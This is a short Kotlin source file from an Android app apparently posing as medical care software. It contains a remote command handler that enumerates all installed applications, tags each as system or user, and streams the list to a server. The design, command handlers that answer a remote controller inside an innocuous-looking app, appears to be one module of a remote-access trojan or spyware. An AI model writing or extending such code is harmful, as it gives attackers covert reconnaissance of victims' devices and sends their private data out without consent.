package com.example.medicalcare.features.network.commands

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import java.io.DataOutputStream

class AppList(private val context: Context) : CommandHandler {
    override fun handle(command: String, toServer: DataOutputStream) {
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)

        toServer.write("----------Installed Apps----------\n".toByteArray())

        apps.forEach { appInfo ->
            val label = appInfo.loadLabel(pm).toString()
            val packageName = appInfo.packageName
            val isSystem = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0
            val type = if (isSystem) "System" else "User"

            val entry = "[$type] $label ($packageName)\n"
            toServer.write(entry.toByteArray())
        }

        toServer.write("----------End of List----------\n".toByteArray())
        toServer.flush()
    }
}